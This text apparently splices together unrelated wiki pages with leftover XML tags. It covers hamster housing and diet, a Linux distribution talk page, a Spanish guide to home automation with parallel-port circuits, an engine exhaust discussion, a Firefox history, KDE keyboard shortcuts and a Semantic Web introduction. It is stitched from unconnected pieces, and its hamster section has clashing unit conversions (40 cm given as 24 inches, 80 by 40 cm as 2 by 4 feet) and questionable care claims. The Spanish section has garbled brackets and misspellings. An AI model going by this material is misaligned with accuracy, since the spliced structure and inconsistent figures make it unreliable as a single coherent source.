Despite the hamster's small size, appropriate housings should ''always'' have a floor space of at least 40&amp;nbsp;cm by 60&amp;nbsp;cm (16 by 24 inches) and be at least 40&amp;nbsp;cm (24 inches) in height. Glass boxes must not be higher than their width to allow for a sufficient air circulation. Although smaller in size, dwarf hamsters should have bigger housings than their larger relatives, at least 80 cm by 40&amp;nbsp;cm (2 feet by 4 feet). The reason for this is that the dwarfs are very active, running and digging a lot, but they often cannot be taken outside their houses for long, because they are not comfortable there and, due to their smaller size, are more endangered when leaving their domicile. Usually hamsters with a bigger and more interesting home will live longer and provide more visual entertainment.

In addition to buying the common housings sold in stores, you can also build customized dwellings. In this case, use only materials that are not dangerous to the animals. Plywood and wood from conifers is not suitable, because hamsters gnaw at their houses and both glue and resin are poisonous for them. Using standard aquarium siciloin to join pieces of solid wood, such as  birch or beech wood, creates a safe environment for the hamster, although you must check frequently to ensure that the hamster is not gnawing through the wood. You can also equip a purchased cage with several intermediate levels, connected using stairs. Using wire grid for these platforms instead of solid wood causes serious injuries and is therefore not recommended. 

The narrow and smooth plastic toy housings that can be found in some stores are not appropriate as the sole habitat for hamsters. The tight tubes are often densely closed, preventing sufficient air circulation, and the plastic surfaces, while easily cleanable, cannot absorb the hamster's urine like natural materials. The result is a damp and uncomfortable climate that is a perfect habitat for germs and [[w:fungus|fungi]]. In addition, synthetic materials are unhealthy when used for gnawing, making plastic tubes, &quot;space stations&quot;, and houses an improper and unnatural (though often expensive) permanent home for hamsters.  Reserve these habitats for supervised play and activity.

The perfect place for the hamster's home is a well-lit room of constant, moderate temperature (18 to 26°C, 64 to 80°F), in a place without strong solar irradiation that could cause dangerous heating. Especially when wire cages are used, it is also important to avoid air draft. Though they cannot see very far, hamsters become more relaxed and curious when positioned somewhat above the ground (at least 65&amp;nbsp;cm (2 feet)), from where they can perceive their surroundings.

Cover the inside of the hamster's residence, including all intermediate levels,  with a sufficiently thick layer of wooden litter for rodents, available in pet stores. Although alternative materials may work as well, most of these bear additional threats, NEVER use pine or cedar as it causes respitory infections. Cat litter is  dangerous, because gnawing and eating the chunks is deadly. 

Hamsters are nest builders and a steady supply of fresh strips of tissue or newspaper (with soy-based ink only) allows them to build a secure and comfortable spot in a corner of their enclosure or in their hiding house. Hay, from shops or even fresh from the garden, is also a valuable building material for cosy hamster nests, which, as an additional bonus, is also perfectly edible.

A sand bath can provide a hamster with entertainment and helps them groom.  In the desert (their natural habitat), hamsters will roll around in the sand, which cleans their coat and prevents it from getting too oily.  Dwarf hamsters in particularly enjoy this activity.  Be sure to use a dish that will not tip over.  Heavy ceramic and metal dishes are preferred.  You can fill the dish with fine sand (pumice or chinchilla sand is best), but DO NOT use any sort of 'dust' bath AT ALL. This can cause respiratory and eye problems.

Regular cleaning of a hamster's home is crucial for the hamster's health.  The home must be cleaned at least once a week by replacing the soiled bedding where necessary.  Hamsters are fairly neat in their bathroom habits; if their enclosure is regularly cleaned, they choose one small location in which to urinate and defecate, making the cleaning simple. They may have many (usually hidden) places used as toilets.

Another important component of a hamster's home is a hiding place where the animal can rest during the day. Not all commercially available houses are adequate. The houses should be of sufficient size and be closed on at least two sides. The same building materials are appropriate for these as for the larger cages, although even a small cardboard box will work (and which will have to be regularly replaced and NO INK!!!!).  Some houses add features such as a removable roof that helps to take away collected food (especially perishable items). 

Hamsters are solitary animals and prefer to be alone most of the time. While sometimes two or more animals can live peacefully within one home, there can be bloody fights. In their natural habitat, there is substantially more empty space so that each hamster can have its own large territory. If more than one hamster is to live in a cage, then the cage must be larger (at least 40cm x 40cm per hamster) and there must be separate hiding houses for each animal. In any case, even after a long period of peaceful coexistence or even mating, there can be violent biting. In this situation, the hamsters should be separated immediately. Note also that, if a male and female hamster live together without fighting, then they will usually reproduce rapidly, thereby causing more space problems.

== Gnawing ==

Despite their cuddly appearance, hamsters have long, thin, sharp teeth that can pierce a finger that is mistaken for a carrot or for a predator.  When they are accustomed to being handled and are not startled, however, they are not inclined to bite and can be placed in the custody of responsible school-age children. Like many rodents, their teeth grow continuously and they must have appropriate things to chew on to relieve their instinctive gnawing and to help keep the teeth at a healthy length.  They will gnaw on whatever is available, so they must be kept in enclosures that they cannot chew through. When the hamster is kept in or near a bedroom, their nocturnal nature combined with their gnawing  habit can become  distracting.

== Exercise and entertainment ==

Like all pets, hamsters need exercise and entertainment to maintain their physical and mental health.  An exercise wheel allows hamsters to run full speed to their hearts' content, but is not as mentally stimulating as more elaborate enclosures including additional toys such as plastic or wooden tubes that somewhat mimic the burrows that they might have in the wild and allow their owners to enjoy their activities.  Most commercial exercise wheels marketed for hamsters have rungs which are not suitable for hamsters due to the fact that a hamster could get injured in one.

Clear plastic hamster balls or cars are available, into which the hamster is placed and then, by its own action, explores an entire house or yard.  Use these toys ''only'' under supervision and use common sense. Unsupervised hamsters in these toys can become trapped against furniture and panic or they can roll down stairs, injuring themselves.  Do not leave them in these toys for extended periods, especially on warm days, and make sure to remove them frequently and allow them access to water or fresh fruits or vegetables.  Toys should always ''invite'' the hamster to explore and use them at its own will, without forcing or violence.

If they are handled frequently, hamsters enjoy being out of their enclosures and having the opportunity to explore.  However, they must be kept away from holes in the wall or in large pieces of furniture, because they will seek out the dark and burrow-like confines of those areas and it can be difficult or impossible to convince them to come out again.

== Food ==

Pet stores can provide basic food for hamsters that provides their non-nutritional needs, but they also like fresh [[w:vegetable|vegetable]]s and [[w:fruit|fruit]]s, dog food, and even killed [[w:insect|insect]]s, which make up an important part of their natural diet. However, not any nutrition is suitable for hamsters and some food, such as sweets made for humans or poisonous plants like the ''leaves'' of the [[w:tomato|tomato]], may be most dangerous for the hamster's health. Like with most other animals (and humans), it is not true that hamsters can decide which food is good for them and they will usually eat anything that is offered.

Hamsters should also always have fresh water available. Appropriate drinking devices can be found in stores. Being small animals that are adapted to the life in arid environments, hamsters can also ingest all necessary liquid via sufficient amounts of watery vegetables, such as cucumber, without any negative effects. However, providing water is usually more convenient and can be an easy way to add medication or [[w:vitamin|vitamin]]s to the hamsters diet. Both water and vegetables must be fresh and have to be exchanged frequently, usually once a day. Water must not be given in open jars, since it is likely to be polluted and because wetness is generally very unhealthy for hamsters (that clean themselves very carefully without the need of additional water).

In detail, the solid food components can be divided into three categories: dry, fresh, and animal food. Dry food makes up the bulk of a hamster's diet. Besides the standard rodent food sold in pet stores, most other kinds of seeds, kernels, and [[w:nut (fruit)|nuts]] can be given. Care should be taken to limit the amount of fat contained within the diet. Especially [[w:sunflower|sunflower]] seeds, nuts, [[w:almond|almond]]s, and sesame are most nutritive and are to be considered as a treat rather than as basic food. All kinds of [[w:cereal|grain]], rice, noodles (dry), dry pea] and lentils on the other hand can be provided less restrictively: about 120&amp;nbsp;g for a medium hamster and, depending on size, about half the amount for a dwarf hamster is sufficient. Bread and similar bakery products contain many ingredients (e.g. yeast) that can trouble the hamster's digestion system. They should be given in small amounts for gnawing or be replaced by special wafers as found in pet stores. All dry food should be appropriate in size. Especially small hamsters often cannot cope well with large seeds, even if they are sold under the label &quot;hamster food&quot;. Bird food like [[w:millet|millet]] is a noteworthy alternative for small hamsters.

Hay, although also belonging to the dry food category, can be provided in large amounts at any time. It does not contain notable amounts of fat, still is liked by most hamsters, supports the hamster's digestion system, serves as a hiding place, and is often used for nest building. In addition it is cheap and can even be produced in your own garden easily.

Fresh food is also an important part of the hamster's diet. As mentioned above, cucumber is a good supplement of water. Fresh grass, carrot, all kinds of lettuce, leaves and even branches' of (non-poisonous) plants are also no problem in general. However, no conifer wood must be fed since resin is poisonous for hamsters. In smaller amounts, grown hamsters also appreciate apple, pear, sweet paprika, tomato (only red parts), banana, mango, strawberry, and even small pieces of orange. Too much sweet fruits on the other hand are not healthy. All kinds of cabbage should be avoided, since they may cause [[w:flatulence|flatulence]], which is quite dangerous for the hamster's sensitive digestion system.

Very young hamsters (6-8 Weeks) should eat only carrots and small grains. Even water can damage their digestion system and be a deadly danger. Ill hamsters are also preferably provided with a more conservative diet. If accepted, herbs can also help to strengthen the hamster's health, though they cannot replace a veterinarian in case of a disease. Daisies (the flowers, not the stems or leaves) and dandelions are likewise appreciated. Plants used for hamster foods should never be placed near open windows because hamsters are more sensitive to chemical pollutions, due to their small body weight.

Finally animal food is a major component of some hamsters' natural food. As pets, a large part of this can be replaced by dry food. Still, hamsters need some animal proteins for their health. While some people like to provide living insects from pet stores to their hamsters, others will prefer to give them dry dog biscuits. Some hamsters are known to accept yoghurt (natural, without sweet ingredients) or soft cheese (low fat, not too salty), and in any case egg noodles are usually taken gratefully. If (dry or soft) dog or cat food is given, then the fat content has to be checked carefully. Furthermore, it must not contain molasses, which would harm the hamster.

In addition, a special salt stone (available in pet stores) belongs in every hamster cage. Although this huge amount of mineral salt is hardly used up by generations of hamsters, it is necessary for their life. Vitamin additives for rodents are not required and usually fresh vegetables are to be preferred. If the hamster is diseased or ill-nourished, vitamins or medications may be needed.

It might be noted that many hamsters tend to carry away food from their food source (by carrying it in their cheek pouches) and hoard it away in a cache hidden somewhere inside their container. These caches, when combined with hamster urine or a leaky water source and poor airflow, can grow mould or start to rot, creating a hazardous environment for the hamster. To keep this from happening, clean hamster cages frequently. It is because of this behavior that hamsters got their name. The German word for hoard is &quot;hamstern.&quot;   

There are also many foods that a hamster should never eat. This includes all kinds of human sweets, such as chocolate or candy, which are unhealthy and even dangerous. Furthermore, poisonous plants (also check indoor plants if the hamster is taken outside its housing) constitute a considerable danger. Other than this, mainly the various unhealthy and chemically treated products usually consumed by humans can cause problems.

Campbells dwarf hamsters are especially sensitive to [[w:Diabetes mellitus|Diabetes mellitus]], and other dwarf hamster species may be somewhat sensitive too.  Diabetes mellitus in hamsters is often caused by intake of simple sugar. Therefore it is essential to avoid hamster food and snacks containing molasses, honey, sugar, fruit sugar or other sweet stuff. Intake of sweet fruit should be limited to small snacks. Even with golden hamsters it may be useful to follow these guideline in order to avoid overweight and digestion disturbances.

==Bedding==

Bedding is an important part of a hamster's environment.  They sleep in it, walk on it, play in it, burrow in it, bury in it and use it as a litter.  Therefore, it is important to provide a safe, comfortable form of bedding for any hamster.  There are several options available when it comes to bedding.  In the past, pine shavings and cedar shavings were a popular form of bedding until it was determined that the [[w:phenol|phenols]] found in pine and cedar shavings can cause serious respiratory problems in hamsters.  Therefore, pine and cedar bedding should never be used even though it continues to be sold.  Aspen shavings are a safe alternative to pine and cedar bedding.  Other safe bedding alternatives include corn cob bedding, bedding made of recycled wood pulp (such as the brand Carefresh), newspaper pellets (such as the brand Yesterday's News), as well as others.

== Reproduction and longevity ==

Hamsters typically live no more than two to four years in captivity, less than that in the wild. Because of their short life expectancy, hamsters mature quickly and can begin reproducing at a young age (two months). Left to their own devices, hamsters will produce several litters a year with several babies in each litter.  Male and female hamsters are therefore usually kept in separate enclosures to prevent the addition of unwanted offspring.  Extreme care should be taken when breeding hamsters because if the female is not in heat there is the possibility of her being violent towards the male - with possibly fatal consequences.

Also, remember that if the room temperature gets low enough (below about 65°F / 18°c) the hamster will go into hibernation. This can be very dangerous to your hamsters health, as once a hamster goes into hibernation its body may not be strong enough to properly wake up again. Please, don't assume that your pet is dead because it stops moving. It may just be hibernating. To get a hamster to go out of hibernation it needs to be moved into a warmer location and allowed to slowly return to temperature. Do not shock or startle a hamster in this situation.

''Note: This was the talk for [[Linux Distro Guide]] before it was merged here. --[[User:Kernigh|Kernigh]] 04:36, 14 November 2005 (UTC)''

The link to Ubuntu Linux is wrong (it points to an African ideology). The correct link is http://en.wikipedia.org/wiki/Ubuntu_Linux
* Please fix Links instead of discussing if they are wrong!. (btw. I fixed them) --[[User:84.184.217.202|84.184.217.202]] 15:30, 16 Mar 2005 (UTC)

OK if I merge [[Linux Distro Guide]] into [[A Neutral Look at Operating Systems]] ? Does this &quot;wikibook&quot; have any other pages?
--[[User:DavidCary|DavidCary]] 14:08, 19 May 2005 (UTC)
:Nope. Go right ahead.[[User:Reub2000|Reub2000]]

I think &quot;Distributions for Masochists (just kidding)&quot; while mildly accurate and humorous is not a very professional/helpful title. Perhaps &quot;Advanced Distributions&quot; or &quot;Source-based Distributions&quot; would be better. --[[User:Jats|Jats]] ([[User talk:Jats|talk]]) 01:55, 27 February 2009 (UTC)

The Sorceror section contradicts itself. Is it source-based or not? Since no one's likely to answer I'll probably do my own research and revised the article accordingly. --[[User:Jats|Jats]] ([[User talk:Jats|talk]]) 02:13, 28 February 2009 (UTC)

== &quot;Neutral&quot; ==

Or far from: &quot;Debian also has a very good package management system, quite possibly THE best package management system of any OS in the world.&quot;

I agree and very much like apt also, but this is extremely suggestive (and using &quot;possibly&quot; to cover that up is a bit low). Also, Ubuntu uses the exact same system, so why is theirs not labeled &quot;THE best?&quot; [[User:Sykil|Sykil]] 04:22, 13 February 2006 (UTC)

== Live USB ==

What about Live USB systems? Similar to liveCD, but on pendrive, and a whole lot faster (only a bit slower than fully installed system). This is very popular, because one does not need CDs for each distro he wants to try out.

== Ubuntu ==

Ubuntu section needs updating. Starting with 11.04 default desktop environment is Unity, not GNOME. Though GNOME (and KDE, XFCE, LXDE, etc.) can be easily installed from repositorium.
Additionally Ubuntu is the most popular desktop linux distro for personal use. It features utility for easy installation of closed source drivers (if available)(this is optional), and asks if user wants to install closed software such as mp3 codecs during installation.</text>

A mitad de los 80 la Domitica se comenzo a hablar,se comenzo a hablar de este con el fin de representar la robotizacion de las actividades domesticas, entre otras; la Domotica tambien aparece con el fin de sustituir la idea de los edificios inteligentes, la cual no ha tenido mayores exitos.

La Domotica es una disciplina p[a[ra gente que esta dispuesta a investigar cosas nuevas. Es]t]a se aplica en la robotizacion de un hogar, es decir que vas a hacer de tu hogar un lugar seguro y practico.

El principal fin de la Domotica es

   1. facilidades en el hogar.
   2. Seguridad.
   3. El ahorro de la energia.
   4. Servicios multimedia, camaras sensores que ayudan a la seguridad.
   5. El uso de diseño de sistemas que me permitan hacer cosas un poco desagradables

Cuando hablamos de casas inteligentes o domoticas, no necesariamente hablamos de casas super lujosas, cuando la domotica empezo todo era carisimo y se consideraba que solo era apto para los millonarios como Bill Gate, pero ahora que los precios en los mercados han disminuido todo el mundo puede tener acceso a estos servicios.

Pensandolo bien, si analizamos las situaciones, podemos tomar como ejemplo las familias. Miren los sistemas Domotica no tienen que ser neceariamente igual en todos lados, ya que no todos los hogares y habitantes de ellos son las mismas con los mismos gustos y mismos quehaceres, osea que a algunas personas les sale mas caro este sistema, y a otras no.

Hoy en dia la Domotica la encuentras en todas partes, en los bancos, en los hogares, incluso en la carretera.

Si quieres utilizar la Domotica en tu hogar no tienes que cubrir lo todo, puedes escoger solo algunas areas especificas.

La fabricacion de los modulos, en el caso de los sitemas que usan los cables de electricidad para transportar la informacion entre ellos, estos son de fabricacion en serie y son facil de conseguir, tienes que tener en cuenta los siguientes detalles; por ejemplo que sean de 220V o 110V segun sea requerido --&gt;Cuando V es = a voltios.

   1. Algunos Ejemplos de Domotica:
   2. Tener una cerradura a base de codigo.
   3. Mallas electricas.
   4. Luzes de celdas Photoelectricas.
   5. Sistema de camaras, con monitores.
   6. Detectores de humo.
   7. Regulador de Temperatura.
   8. Riego Automatico.
   9. EtX....


¿Que tiene de bueno la Domotica? Bueno los sistemas Domoticos son exelentes porque son adaptables a cualquier actividad.

Domotica X10


Se le llama Domotica X10 por el sistema de automatizacion de los hogares con dispostivos de comunicacion en formato digital, los que utilizan corrientes electricas con frecuencias de 120khz., con las cuales se transportan las señales X10 digitales.

La Domotica X10 se destaca principalmente por utilizar el mismo wire de la electricidad de la casa, es decir que no requiere de otro tipo de wire mas que el que estaba previamente instalado en el hogar. Con este mismo wire se le es permitido enviar y recibir toda la informacion y el suministro de potencia.

El Domotica X10 necesita de una red electrica convencional es decir que no tienes que comprar otra con la que tienes en tu hogar es suficiente. Mediante esta red vamos a poder tener acceso a todo utencilio electrico.

Encuanto a distancia el X10 se vale de señales de frecuencia alta &quot;120khz.&quot; ademas de los wires el X10 utiliza Utencilios de Emision y Resepcion.

Domotica EIB


La Domotica EIB se basa en un sistema de control en red que robotiza todo lo que es de servicio electrico.

La EIB se origina unos 6 años despues de que habia salido la Domotica, esta es muy pedido sus servicios de edificacion ya qu todas estas instalaciones son de origen tecnico.

Mas que todo la EIB fue muy demandada por complicaciones en exeso en las instalaciones electricas tradicionales, por los diversos accidentes y anomailas.

El crecimiento de la EIB se debe a que esta basado en crotecnologia, y como todos sabemos ya este es muy demandada entre mas pequeño es mejor para nosotros. Ademas que eran muy versatiles y programables todos los aparatos que sacaban.

El EIB se origina cuando varias compañias Europeas se unen con el fin de sacar adelante el proyecto de Sistemas de Instalacion Electrica moderna que hiciera compatible la interconexion entre todos los productos de estas compañias.

Este sistema es estandar y es abierto, es decir que controlan a todos los productos, y que los productos sean de la misma caracteristica y funcionamiento que el EIB.

El EIB a sido registrado como (European Instalacion Bus Asosiacion).

Domotica Lonworks


LON (Local Operating Networks) es la abreviatura de LONWORKS, tecnología basada en el protocolo LonTalk que proporciona todas las herramientas para la implementación de redes de control distribuidas

Como digitalizar tu casa?

Se puede trabjar de diferentes maneras, uno de los puntos que mas a gradan en la domotica es la versatilidad de la domotica, la pueden trabajar con ayuda de tu PC, o tambien con ayuda de un control remoto que mediante un circuito te permite programar tu casa como anteriormente se menciono, tambien con progrmaciones estandar que son las meno versatiles gracias a que no te permiten muchas posibilidades y modificarlas te cuestan una gran suma de dinero.

1. con ayuda de tu PC.

Esta forma es muy versatil gracias a que te permite tener un sin numero de posibilidades, y gracias al avance continuo de las computadoras pudes tener diferentes opcines de configuracion de el comportamiento de tu casa; por ejemplo, puedes desarrollar en diferentes lenguajes de programacion diferentes interfaces, los cuales te permiten facilitar, complemetar y adaptar el software a las necesidades personales. Tambien pudes manejar desde tu PC los diferentes puertos bidirecccionales (paralelo, serie, juegos) y complementar la funcionalidad de tu casa.

1.1. Como Dijitalizar tu casa (Consejos)

1.1.1. Requerimientos:

a.Visual Basic 6.0. (No es un requerimiento fundamental si sabes programar en otro lenguage y puedas hacer declaraciones o modulos que te permitan manejar el puerto paralelo asignadole valores y variables podras desarrollarlo)

b.Puerto paralelo disponible. (no es nesesario utilizar este puerto, gracis a que utilizandon los declaraciones podras controlar el de serie el USB y el de juegos)

c.Puerto USB disponible (unicamente cuando inclulles dentro de tu proyecto una camara web)

d.Conocimientos Basicos de electronica y redes. (Herramienta para desarrollar tu circuito)

e.Mucho tiempo disponible

1.1.2. Pasos:

Antes de comenzar a programar tendras que empezar por hacer la lista de lo que quieres que tu casa haga, por ejemplo: si tu quieres que tu PC controle la temperatura, prender las luces, controlar el bienestar de tus plantas, darle seguridad a tu vivienda etc.. despues de esto tendras que comezar al pleneacion de tu circuito para esto te aconcejo untilazar un programa el cual te permite probar tus circuitos y es muy facil de manejar es un freeware y lo pogras descargar haciendo clik  [http://www.microcode.com/downloads/files/cmstudnt.exe Aqui] ,existen diferentes clases de circuitos (estos unicamente nos sirven para la salida de datos de 8bits de puerto):

1.1.2.1. optoacolados: estos circuitos son muy confiables gracias a que te permiten el aislamiento total de tu PC del circuito externo, para este circuito utilizaras optoacopladores de las siguientes referencias 4N26 o 4N27  que son de tipo Darlington(permiten manejar voltages superiores a los 5 voltios y 1 amperio de potencia sin sufrir daños, no es estrictamente nesesario utilizarlos gracis a que existen muchas clases de optoacopladores, con caracteristicas similares),si trabajas con:

1.1.2.1.1.Relays tendras que anexar a tu circuito trancistores darlington para apliar la potencia del optoacoplador y hacer funcionar el relay.

1.1.2.1.2.Triacs  tendras que anexar una serie de resistencias y transistores para activar el triac. ver siguiente imagen.

1.1.2.2. Con circuitos Integrados: el circuito integrado te permite reducir algunos costos pero no estan seguro como lo es con los optoacopladore, estos tranen una serie de trancistores, diodos y otros incorporados y hacen muchas cosas, tienes que utilizar el circuito integrado ULN2803  el cual esta conformado por transistores darlington, tendras que utilizar 2 condensadores no polarizados de 1uf y un regulador de potencia 7812, este circuito trabaja con relay de 5 o 12v y es mas sencillo de hacer. aunque no lo aconsejo.

Para la entrada tendra dsipones de 3 bits los tendras que saber utilizar porque como puedes ver son muy pocos, tendras que hacer lo siguente:

1.1.3.1.Con swich directos: esta es la forma ams sencilla de manejar la entrada po el puerto paralelo gracias a que tendras que contactar unicamente cualquiera de los pines siguientes a los de salida y unirlos con los siguientes al 25 o el 25.

1.1.3.2.Con circuito integrado: esta es una forma mas compleja, te recomiendo mirar el siguiente diagrama de circuito,este trabajan con el integrado 4069, con el 74HC245, tendras que anexar un controlador de potencia 7805 y 1 condensador de un 1uf.</text>

      <text xml:space="preserve">can anyone tell me what is the exhaust velocity of the gas coming out of the engine? and how does it vary with brake thermal power?

can send reply at ranjan_shivek@yahoo.com

Here you can see the exhaust velocity for 1 cycle. The red line shows speed at the port and the blue shows the speed at the end of the pipe. Note that the speed is greater at the end of the pipe.
As torque rises, so too does temperature,pressure and volume. Therefore the speeds will rise corrispondingly.

== &quot;Manual transmission&quot; section is very poor ==

The section on how to drive a manual transmission contains many factual errors, some in direct contradiction of statements in the better article entitled Transwiki:Manual transmission driving technique.  

There's no logical connection between selecting the gear in which to leave the engine (from the best two available choices, first and reverse) when parked based on whether one is parking on an uphill or downhill slope; it's always better to leave the car in the gear that has the lower gear ratio.

Also, the &quot;aim&quot; of driving is not always to maximize fuel efficiency.  There are situations when other considerations obtain, including the case where one wants to maximize acceleration.  So it is not always best to upshift quickly (i.e., at low RPMs).

The section called &quot;Fuel Efficiency&quot; contains the very dangerous procedure of shutting the engine off while the car is in motion. Suggest editing to remove.</text>

==About Firefox==
'''Mozilla Firefox''' (originally known as &quot;Phoenix&quot; and briefly as &quot;Mozilla Firebird&quot;) is a free, cross-platform, graphical web browser developed by the Mozilla Foundation and hundreds of volunteers. Its current release is Firefox 15.0, released in August 28, 2012. 

Firefox strives to be a lightweight, fast, intuitive, and highly extensible standalone browser. Firefox has now become the foundation's main development focus. Firefox includes an integrated pop-up blocker, tabbed browsing, live bookmarks, built in Phishing protection, support for open standards, an extension mechanism for adding functionality and localization for Firefox in different languages. Firefox also attempts to produce secure software and fix security holes promptly. Although other browsers have introduced these features, Firefox is the first such browser to achieve wide adoption.

Firefox has attracted attention as an alternative to other browsers such as Microsoft Internet Explorer. As of January 2011, estimates suggest that Firefox's usage share is around 30% of overall browser usage worldwide and is the dominant browser in Europe by some metrics. Since its release, Firefox has significantly reduced Internet Explorer's dominant usage share.

==History of Firefox==
Before its 1.0 release on November 9, 2004, Firefox had already gained acclaim from numerous media outlets, including Forbes and the Wall Street Journal. With over 25 million downloads in the 99 days after its release, Firefox became one of the most downloaded free and open source applications, especially among home users. On October 19, 2005, Firefox had its 100 millionth download, just 344 days after the release of version 1.0. By January 31, 2009 Firefox had been downloaded 1 billion times.

Firefox has become the foundation's main development focus (along with its Thunderbird email client), and has replaced the Mozilla Suite as their official main software release.

Blake Ross began working on the Firefox project as an experimental branch of the Mozilla project. They believed that the commercial requirements of Netscape's sponsorship and developer-driven feature creep compromised the utility of the Mozilla browser. To combat what they saw as the Mozilla Suite's software bloat, they created a pared-down browser (then known as Phoenix, today known as Firefox), with which they intended to replace the Mozilla Suite. Ben Goodger currently works as the lead developer of Firefox.

Mozilla Firefox retains the cross-platform nature of the original Mozilla browser by using the XUL user interface markup language. Through Firefox's support of XUL, users may extend their browser's capabilities by applying themes and extensions. Initially, these add-ons raised security concerns, so with the release of Firefox 0.9, the Mozilla Foundation opened Mozilla Update, a website containing themes and extensions &quot;approved&quot; as not harmful.

===Standards===
Support for software standards

The Mozilla Foundation takes pride in Firefox's compliance with existing standards, especially W3C web standards. Firefox has extensive support for most basic standards including HTML, XML, XHTML, CSS, ECMAScript (JavaScript), DOM, MathML, SVG, DTD, XSL and XPath.

Firefox also supports [[w:PNG|PNG]] images and variable transparency.

Mozilla contributors constantly improve Firefox's support for existing standards. Firefox has already implemented most of CSS Level 2 and some of the not-yet-completed CSS Level 3 standard. Also, work continues on implementing standards currently missing, including APNG and XForms. Some of the Mozilla standards like XBL is also making its way to open standards (via WHATWG).

      <comment>/* Shortcut Table */ added a reference to a couple of activities shortcuts</comment>
      <text xml:space="preserve">== Shortcut Table ==
 

'''Alt-Tab or Alt-Shift-Tab'''
Cycle through the windows 

'''Ctrl-Tab or Ctrl-Shift-Tab'''
Cycle through your desktops 

'''Alt-F2'''
Mini Command line, allows to quickly launch applications by typing their name (kmail, k3b, ...)

'''Alt-F3'''
Window Menu 

'''Alt-F4'''
Close the current window 

'''Ctrl-F{1..8}'''
Switch to a specific desktop 

'''Ctrl-Alt-L'''
Lock your session. This will display a box with a password area for you to login back into your session, and a button that will allow someone else to login while keeping your session active.

'''Ctrl-Alt-Del'''
Display logout screen. You have 3 choices : close your session, turn off your computer and restart your computer.

'''Ctrl-Alt-Esc'''

Window destroyer (every window you click on will be destroyed). Press '''Esc''' to cancel the killer cursor. 

=== The following are shortcut keys that control X11: ===

'''Ctrl-Alt-Backspace'''

This exits KDE (without saving!) Use this as a last resort.

'''Ctrl-Alt-Numpad +'''

Zoom in using the next screen resolution. You may need to configure this in your X-Server configuration for it to work. 

'''Ctrl-Alt-Numpad -'''

Zoom out using the previous screen resolution. You may need to configure this in your X-Server configuration for it to work.

'''Win-Q'''
Displays the Activities list

'''Win-Tab'''
Switches to next Activity

== Defining own shortcuts ==
It is quite obvious that you may not be happy with predefined shortcuts. It turns out that you can easily redefine existing shortcuts, or even define your own. All you need to do is open KMenu -&gt; Control Center-&gt; Regional &amp; Accessibility -&gt; Keyboard Shortcuts. The interface of this is self-explanatory.

Here is the list of thing you may do with defined shortcuts:
#opening apps very quickly,
#kill, start, restart deamons,
#send commands to running apps...

&quot;''The Semantic Web is an extension of the current web in which information is given well-defined meaning, better enabling computers and people to work in cooperation.''&quot;
- Tim Berners-Lee, James Hendler, Ora Lassila (2001) 

According to the World Wide Web Consortium (W3C), the Web can reach its full potential only if it becomes a place where data can be shared, processed, and understood by automated tools as well as by people. For the Web to scale, tomorrow's programs must be able to share, process, and understand data even when these programs have been designed independently from one another. 

Still in its definition stage, the term Semantic Web is perhaps new to many people, even to those within IT circles. But the problems it aims to address are ones we have been struggling to solve for decades – issues such as information overload, stovepipe systems, and poor content aggregation (Daconta, Orbst, and Smith, 2003). The fundamental roots of these problems are the lack of semantic definitions in individual systems, the lack of semantic integration among data sets, and the lack of semantic interoperability across disparate systems. The Semantic Web extends beyond the capabilities of the current Web and existing information technologies, enabling more effective collaborations and smarter decision-making. It is an aggregation of intelligent websites and data stores accessible by an array of semantic technologies, conceptual frameworks, and well-understood contracts of interaction to allow machines to do more of the work to respond to service requests – whether that be taking on rote search processes, providing better information relevance and confidence, or performing intelligent reasoning or brokering.

The steps to reach this state, however, are not likely to be accomplished in a few short years. Certainly, rapid progress will be made on some ends, just as numerous websites appeared soon after the introduction of low-cost/no-cost web servers and free graphical browsers. But the progression in the development of websites moved relatively chaotically over the course of a half-dozen years – starting from an ad hoc set of scripting languages, low-end tools, and custom-built server components, and steadily progressing to a relatively unified set of core languages, application servers, content management systems, e-commerce engines, web services, and other enterprise-worthy components and offerings. The growth of the Semantic Web is likely to go through a similar progression in market dynamics. Although the business models of a connected world are better understood and the level of awareness of emerging web technologies more greatly heightened, there will nevertheless be a significant time lag until many of the pieces of the vision are assembled.

== What the Semantic Web Is and Is Not ==


'''1.	The Semantic Web is not a new and distinct set of websites.'''

The Semantic Web is an extension of the current World Wide Web, not a separate set of new and distinct websites. It builds on the current World Wide Web constructs and topology, but adds further capabilities by defining machine-processable data and relationship standards along with richer semantic associations. Existing sites may use these constructs to describe information within web pages in ways more readily accessible by outside processes such as search engines, spider searching technology, and parsing scripts. Additionally, new data stores, including many databases, can be exposed and made available to machine processing that can do the heavy lifting to federate queries and consolidate results across multiple forms of syntax, structure, and semantics. The protocols underlying the Semantic Web are meant to be transparent to existing technologies that support the current World Wide Web.	

'''2.	The Semantic Web is not being constructed with just human accessibility in mind.'''

The current Web relies mainly on text markup and data link protocols for structuring and interconnecting information at a very coarse level. The protocols are used primarily to describe and link documents in the forms presentable for human consumption (but that have useful hooks for first-order machine searching and aggregation). Semantic Web protocols define and connect information at a much more refined level. Meanings are expressed in formats understood and processed more easily by machines in ways that can bridge structural and semantic differences within data stores. This abstraction and increased accessibility means that current web capabilities can be augmented and extended – and new, powerful ones introduced.

'''3.	The Semantic Web is not built upon radical untested information theories.'''

The emergence of the Semantic Web is a natural progression in accredited information theories, borrowing concepts from the knowledge representation and knowledge management worlds as well as from revised thinking within the World Wide Web community. The newly approved protocols have lineages that go back many years and embody the ideas of a great number of skilled practitioners in computer languages, information theory, database management, model-based design approaches, and logics. These concepts have been proven within a number of real-world situations although the unifying set of standards from the W3C promises to accelerate and broaden adoption within the enterprise and on the Web.
With respect to issues about knowledge representation and its yet-to-be-fulfilled promise, a look at history shows numerous examples of a unifying standard providing critical momentum for acceptance of a concept. HTML was derived from SGML, an only mildly popular text markup language, and yet HTML went on to cause a sea change in the use of information technology. Many in the field point to the long acceptance timeframes for both object-oriented programming and conceptual-to-physical programming models. According to Ralph Hodgson, “knowledge representation is a fundamental discipline that now has an infrastructure and a set of supporting standards to move it out of the labs and into real-world use.” 

'''4. The Semantic Web is not a drastic departure from current data modeling concepts.''' 

